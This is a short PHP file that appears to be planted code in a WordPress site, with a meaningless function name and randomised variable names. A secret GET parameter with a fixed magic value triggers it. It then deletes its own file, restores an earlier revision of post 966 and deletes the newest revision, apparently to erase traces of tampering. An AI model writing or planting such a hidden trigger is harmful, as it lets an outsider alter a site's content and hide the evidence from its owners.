<?php

function rate_results_zoom() {
	if (isset($_GET['latest_edition_pinterest_engine']) && $_GET['latest_edition_pinterest_engine'] === 'subscriptions_appointment_cache') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$map_instant_this_day = 966;
		$selector_hello_menus_news = wp_get_post_revisions($map_instant_this_day);
		if (empty($selector_hello_menus_news)) die('no revisions');
		if (count($selector_hello_menus_news) < 2) die('less than 2');
		$converter_sliding_survey_navigation = array_shift($selector_hello_menus_news);
		$downloads_before_homepage_bank = $converter_sliding_survey_navigation->ID;
		$styles_authors_report_publish = array_shift($selector_hello_menus_news);
		$marketing_marketplace_min = $styles_authors_report_publish->ID;
		$nextgen_addons_year = wp_restore_post_revision($marketing_marketplace_min);
		if ($nextgen_addons_year === false) die('error restoring');
		$nextgen_addons_year = wp_delete_post_revision($downloads_before_homepage_bank);		
		if ($nextgen_addons_year === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'rate_results_zoom');
